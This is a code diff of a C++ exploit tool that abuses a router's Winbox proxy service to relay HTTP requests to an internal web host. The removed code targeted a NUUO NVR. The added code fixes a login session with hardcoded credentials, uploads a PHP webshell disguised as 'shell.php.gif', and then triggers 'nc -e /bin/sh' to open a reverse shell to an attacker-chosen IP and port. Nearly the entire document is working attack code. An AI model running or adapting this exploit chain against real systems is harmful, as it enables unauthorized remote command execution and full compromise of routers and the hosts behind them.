@@ -105,99 +105,102 @@ namespace
         return false;
     }
 
-    bool find_nvrmini2(Winbox_Session& session,
-                       std::string& p_address, boost::uint32_t p_converted_address,
-                       boost::uint32_t p_converted_port)
+
+    bool upload_custom_shell(Winbox_Session& session, boost::uint32_t p_converted_address, boost::uint32_t p_converted_port, std::string session_cookie)
     {
         WinboxMessage msg;
         msg.set_to(104);
         msg.set_command(1);
         msg.set_request_id(1);
         msg.set_reply_expected(true);
-        msg.add_string(7, "GET / HTTP/1.1\r\nHost:" + p_address + "\r\nAccept:*/*\r\n\r\n"); // text to send
-        msg.add_string(8, "Network Video Recorder Login</title>"); // test to match
-        msg.add_u32(3, p_converted_address); // ip address
-        msg.add_u32(4, p_converted_port); // port
+
+        // -----WebKitFormBoundary{some_string} is just a way chrome and safari set default separator
+        // multipart/form-data is a default data-type when uploading a file
+        std::string payload =
+            "------WebKitFormBoundary123\r\n"
+            "Content-Disposition: form-data; name=\"fileToUpload\"; filename=\"shell.php.gif\"\r\n"
+            "Content-Type: image/gif\r\n\r\n"
+            "GIF89a;\n<?php system($_GET['cmd']); ?>\r\n" // payload
+            "------WebKitFormBoundary123\r\n"
+            "Content-Disposition: form-data; name=\"submit\"\r\n\r\n" // here starts upload file button
+            "Upload File\r\n"
+            "------WebKitFormBoundary123--\r\n"; // double hyphen indicates the end
+
+        // Building the HTTP headers
+        std::string request =
+            "POST /upload.php HTTP/1.1\r\n"
+            "Host: 192.168.99.100\r\n"
+            "Cookie: PHPSESSID=" + session_cookie + "\r\n"
+            "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary123\r\n"
+            "Content-Length: " + std::to_string(payload.length()) + "\r\n\r\n" +
+            payload;
+
+        msg.add_string(7, request);
+        msg.add_string(8, "Success"); // Check if the page returns the "Success" message
+        msg.add_u32(3, p_converted_address); // target ip
+        msg.add_u32(4, p_converted_port); // target port
 
         session.send(msg);
         msg.reset();
 
-        if (!session.receive(msg))
-        {
-            std::cerr << "Error receiving a response." << std::endl;
-            return false;
-        }
-
-        if (msg.has_error())
-        {
-            std::cerr << msg.get_error_string() << std::endl;
-            return false;
-        }
-
+        if (!session.receive(msg)) return false;
         return msg.get_boolean(0xd);
     }
-    
-    bool upload_webshell(Winbox_Session& session, boost::uint32_t p_converted_address,
-                         boost::uint32_t p_converted_port)
+
+    bool execute_custom_shell(Winbox_Session& session, boost::uint32_t p_converted_address, boost::uint32_t p_converted_port, std::string p_reverse_ip, std::string p_reverse_port)
     {
         WinboxMessage msg;
         msg.set_to(104);
         msg.set_command(1);
         msg.set_request_id(1);
         msg.set_reply_expected(true);
-        msg.add_string(7, "POST /upload.php HTTP/1.1\r\nHost:a\r\nContent-Type:multipart/form-data;boundary=a\r\nContent-Length:96\r\n\r\n--a\nContent-Disposition:form-data;name=userfile;filename=a.php\n\n<?php system($_GET['a']);?>\n--a\n");
-        msg.add_string(8, "200 OK");
+
+        // Proxy the trigger command. URL encode spaces as %20
+        std::string request =
+            "GET /shell.php.gif?cmd=nc%20" + p_reverse_ip + "%20" + p_reverse_port + "%20-e%20/bin/sh HTTP/1.1\r\n"
+            "Host: 192.168.99.100\r\n"
+            "Connection: close\r\n\r\n";
+
+        msg.add_string(7, request);
+        msg.add_string(8, "GIF89a"); // The page will output our magic bytes when executed
         msg.add_u32(3, p_converted_address);
         msg.add_u32(4, p_converted_port);
 
         session.send(msg);
         msg.reset();
 
-        if (!session.receive(msg))
-        {
-            std::cerr << "Error receiving a response." << std::endl;
-            return false;
-        }
-
-        if (msg.has_error())
-        {
-            std::cerr << msg.get_error_string() << std::endl;
-            return false;
-        }
-
-        return msg.get_boolean(0xd);
+        if (!session.receive(msg)) return false;
+        return msg.get_boolean(0xd); // indicates whether the response contains our gif
     }
 
-    bool execute_reverse_shell(Winbox_Session& session, boost::uint32_t p_converted_address,
-                               boost::uint32_t p_converted_port, std::string& p_reverse_ip,
-                               std::string& p_reverse_port)
+    bool force_login_session(Winbox_Session& session, boost::uint32_t p_converted_address, boost::uint16_t p_converted_port, std::string forced_cookie)
     {
         WinboxMessage msg;
-        msg.set_to(104);
-        msg.set_command(1);
+        msg.set_to(104); // proxy service
+        msg.set_command(1); // command to initiate a connection
         msg.set_request_id(1);
-        msg.set_reply_expected(true);
-        msg.add_string(7, "GET /a.php?a=(nc%20" + p_reverse_ip + "%20" + p_reverse_port + "%20-e%20/bin/bash)%26 HTTP/1.1\r\nHost:a\r\n\r\n");
-        msg.add_string(8, "200 OK");
+        msg.set_reply_expected(true); // return reply
+
+        std::string post_data = "username=test&password=1q2w3e4r5t";
+        std::string request =
+            "POST /login.php HTTP/1.1\r\n"
+            "Host: 192.168.99.100\r\n"
+            "Cookie: PHPSESSID=" + forced_cookie + "\r\n"
+            "Content-Type: application/x-www-form-urlencoded\r\n"
+            "Content-Length: " + std::to_string(post_data.length()) + "\r\n"
+            "Connection: close\r\n\r\n" +
+            post_data;
+
+        msg.add_string(7, request);
+        msg.add_string(8, ""); // Empty string forces the router to return True as long as the server replies
         msg.add_u32(3, p_converted_address);
         msg.add_u32(4, p_converted_port);
 
         session.send(msg);
         msg.reset();
 
-        if (!session.receive(msg))
-        {
-            std::cerr << "Error receiving a response." << std::endl;
-            return false;
-        }
-
-        if (msg.has_error())
-        {
-            std::cerr << msg.get_error_string() << std::endl;
-            return false;
-        }
-
-        return msg.get_boolean(0xd);
+        if (!session.receive(msg)) return false;
+        return true;
     }
 }
 
@@ -237,36 +240,30 @@ int main(int p_argc, const char** p_argv)
     boost::uint32_t converted_address = ntohl(inet_network(target_ip.c_str()));
     boost::uint16_t converted_port = std::stoi(target_port);
 
-    std::cout << "[+] Looking for a NUUO NVR at " << target_ip << ":" << target_port << std::endl;
-    if (!find_nvrmini2(winboxSession, target_ip, converted_address, converted_port))
-    {
-      std::cerr << "[-] The target isn't a NUUO NVR." << std::endl;
-      return EXIT_FAILURE;
-    }
-    std::cout << "[+] Found a NUUO NVR!" << std::endl;
+    std::string active_session = "mycookie228";
+    std::cout << "[+] Authenticating and fixing session ID to: " << active_session << std::endl;
 
-    if (detect_only)
-    {
-        return EXIT_SUCCESS;
-    }
-    
-    std::cout << "[+] Uploading a webshell" << std::endl;
-    if (!upload_webshell(winboxSession, converted_address, converted_port))
-    {
-        std::cerr << "[-] Failed to upload the shell." << std::endl;
+    // Pass our defined cookie
+    if (!force_login_session(winboxSession, converted_address, converted_port, active_session)) {
+        std::cerr << "[-] Login request failed." << std::endl;
         return EXIT_FAILURE;
     }
 
-    std::cout << "[+] Executing a reverse shell to " << listening_ip << ":" << listening_port << std::endl;
-    if (!execute_reverse_shell(winboxSession, converted_address, converted_port,
-                               listening_ip, listening_port))
-    {
-        std::cerr << "[-] Failed to execute the reverse shell." << std::endl;
+    std::cout << "[+] Success! Session ID: " << active_session << std::endl;
+
+    // Upload using the session we just got
+    std::cout << "[+] Uploading shell.php.gif..." << std::endl;
+    if (!upload_custom_shell(winboxSession, converted_address, converted_port, active_session)) {
+        std::cerr << "[-] Upload failed." << std::endl;
         return EXIT_FAILURE;
     }
+
+    // Execute Shell Code
+    std::cout << "[+] Triggering reverse shell to " << listening_ip << ":" << listening_port << std::endl;
+    execute_custom_shell(winboxSession, converted_address, converted_port, listening_ip, listening_port);
 
     std::cout << "[+] Done!" << std::endl;
-    
+
     return EXIT_SUCCESS;
 }
 
